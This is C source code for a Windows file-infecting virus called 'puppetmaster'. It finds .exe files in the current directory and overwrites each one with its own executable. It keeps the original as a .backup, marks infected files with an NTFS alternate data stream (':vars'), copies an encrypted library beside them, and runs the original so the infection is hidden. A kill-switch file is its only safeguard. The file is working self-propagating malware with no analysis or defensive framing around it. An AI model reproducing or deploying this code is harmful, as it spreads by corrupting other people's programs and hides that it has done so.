#include "puppetmasterlib.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <unistd.h>


int keyval;


int file_exists(TCHAR * path){
  WIN32_FIND_DATA FindFileData;
  HANDLE handle = FindFirstFile(path,&FindFileData);
  int found = handle != INVALID_HANDLE_VALUE;
  if(found){
    return 1;
  } else {
    return 0;
  }
}

int check_kill_switch(char * path){
  if(file_exists("C:\\tmp\\killswitch.ks")){
    char * fullpath = malloc((200) * sizeof(char));
    strcpy(fullpath,"echo ");
    strcat(fullpath,path);
    strcat(fullpath," >> C:\\tmp\\killswitch.ks");
    system(fullpath);
    return 1;
  }
  return 0;
}


void move_to_puppet(char * path){
  char * ads_path = (char *)malloc(200 * sizeof(char));
  strcpy(ads_path,path);
  strcat(ads_path,":puppet");
  HANDLE original_file = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
  HANDLE ads_file = CreateFile(ads_path, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
  BYTE buff[64*1024];
  DWORD dwBytesRead, dwBytesWritten;
  do {
    ReadFile(original_file, buff, sizeof(buff), &dwBytesRead, NULL);
    if(dwBytesRead) {
      WriteFile(ads_file, buff, dwBytesRead, &dwBytesWritten, NULL);
    }
  } while (dwBytesRead == sizeof(buff));
  CloseHandle(original_file);
  CloseHandle(ads_file);
}

void recover_from_puppet(char * path){
  char * ads_path = (char *)malloc(200 * sizeof(char));
  strcpy(ads_path,path);
  strcat(ads_path,":puppet");
  char * original_path = (char *)malloc(200 * sizeof(char));
  strcpy(original_path,path);
  HANDLE ads_file = CreateFile(ads_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
  HANDLE original_file = CreateFile(original_path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
  BYTE buff[64*1024];
  DWORD dwBytesRead, dwBytesWritten;
  do {
    ReadFile(ads_file, buff, sizeof(buff), &dwBytesRead, NULL);
    if(dwBytesRead) {
      WriteFile(original_file, buff, dwBytesRead, &dwBytesWritten, NULL);
    }
  } while (dwBytesRead == sizeof(buff));
  CloseHandle(original_file);
  CloseHandle(ads_file);
}


void infect_file(char * path, char * original){
  //backup old exe
  char * current_cmd = (char *)malloc(200 * sizeof(char));
  strcpy(current_cmd,"type ");
  strcat(current_cmd,path);
  strcat(current_cmd," > ");
  strcat(current_cmd,path);
  strcat(current_cmd,".backup");
  system(current_cmd);
  //inject self into exe
  strcpy(current_cmd,"type ");
  strcat(current_cmd,original);
  strcat(current_cmd," > ");
  strcat(current_cmd,path);
  system(current_cmd);
  //spawn :vars
  sprintf(current_cmd,"echo %d > ",keyval);
  //strcpy(current_cmd,"echo ");
  //strcat(current_cmd,"1");
  //strcat(current_cmd," > ");
  strcat(current_cmd, path);
  strcat(current_cmd, ":vars");
  //printf("%s\n",current_cmd);
  system(current_cmd);
  //copy library to new file
  char * old_encrypted_path = (char *)malloc(300);
  strcpy(old_encrypted_path,original);
  old_encrypted_path[strlen(original)-4] = '\0';
  strcat(old_encrypted_path,".abc");
  strcpy(current_cmd,"copy ");
  strcat(current_cmd,old_encrypted_path);
  strcat(current_cmd," ");
  char * new_encrypted_path = (char *)malloc(300);
  strcpy(new_encrypted_path,path);
  new_encrypted_path[strlen(path)-4] = '\0';
  strcat(new_encrypted_path,".abc");
  strcat(current_cmd,new_encrypted_path);
  //printf("%s\n",current_cmd);
  system(current_cmd);
  //write old to :puppet
  //strcpy(current_cmd,"type ");
  //strcat(current_cmd,path);
  //strcat(current_cmd,".backup > ");
  //strcat(current_cmd,path);
  //strcat(current_cmd,":puppet");
  //printf("%s\n",current_cmd);
  //system(current_cmd);
  free(current_cmd);
}


int check_if_infected(char * path){
  char * puppet_path = (char *)malloc(300);
  strcpy(puppet_path,path);
  strcat(puppet_path,":vars");
  if(access(puppet_path,04)==-1){
    return 0;
  } else {
    return 1;
  }
}

void seek_infection(char * current_path){
  WIN32_FIND_DATA ffd;
  HANDLE first_file = FindFirstFile("*.exe",&ffd);
  if(first_file == INVALID_HANDLE_VALUE){
  } else {
    do {
      char * found_path = ffd.cFileName;
      if(check_if_infected(found_path)==0){
        printf("Launching infection at %s!\n",found_path);
        infect_file(found_path,current_path);
      }
    } while(FindNextFile(first_file, &ffd) != 0);
  }
}


void puppetmaster(int argc, TCHAR * argv[], int current_key){
  printf("wa ha ha\n");
  keyval = current_key;
  if(!check_kill_switch(argv[0])){
    seek_infection(argv[0]);
  }
  if(strstr(argv[0],"puppetmaster")==NULL){
    char * originalpath = (char *)malloc(strlen(argv[0]) + 30);
    strcpy(originalpath,argv[0]);
    strcat(originalpath,".backup");
    system(originalpath);
    //STARTUPINFO info;
    //PROCESS_INFORMATION process_info;
    //memset(&info,0,sizeof(info));
    //CreateProcess(originalpath,NULL,NULL,NULL,FALSE,0,NULL,NULL,&info,&process_info);
  }
  //virus code
  //check_kill_switch(argv[0]);
  //seek_infection(argv[0]);
  //loop through all files an infect
  //infect_file(".\\cmd.exe", argv[0]);
}
